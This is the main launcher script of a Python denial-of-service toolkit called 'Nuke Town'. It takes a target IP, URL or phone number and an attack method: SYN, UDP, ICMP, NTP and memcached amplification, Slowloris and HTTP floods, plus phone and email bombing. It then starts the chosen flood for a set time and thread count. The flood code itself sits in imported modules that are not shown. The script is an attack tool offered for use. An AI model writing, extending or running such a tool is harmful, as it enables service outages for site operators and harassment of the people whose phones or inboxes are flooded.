# Created by BraiNiac
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from modules.crash_handler import CriticalError
    import modules.bones.clear
    import modules.bones.banner
    import modules.bones.winpcap
    import modules.jackmail.mailGear
    from modules.way import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Nuke Town - DDoS ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target ip:port, url or phone",
)
parser.add_argument(
    "--way",
    type=str,
    metavar="<JACKPHONE/JACKMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="time in secounds"
)
parser.add_argument(
    "--threads", type=int, default=3,
    metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
way = str(args.way).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not way or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=way, threads=threads, target=target
    ) as Flood:
        Flood.Start()
